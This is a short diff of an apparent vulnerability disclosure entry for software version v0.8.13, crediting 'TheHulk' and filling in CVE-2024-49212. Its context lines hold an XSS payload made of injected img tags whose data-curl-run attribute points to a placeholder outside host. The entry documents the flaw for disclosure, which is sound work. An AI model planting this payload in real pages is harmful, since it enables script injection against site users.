@@ -7,8 +7,8 @@
 + Version: v0.8.13
 + Payload: ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx">```
 + Impact: XSS
-+ CVE: CVE-2024-XXXXX
-+ Status: Reported(MITRE)
++ CVE: CVE-2024-49212
++ Status: Reported
 + Foundby: TheHulk
 
 
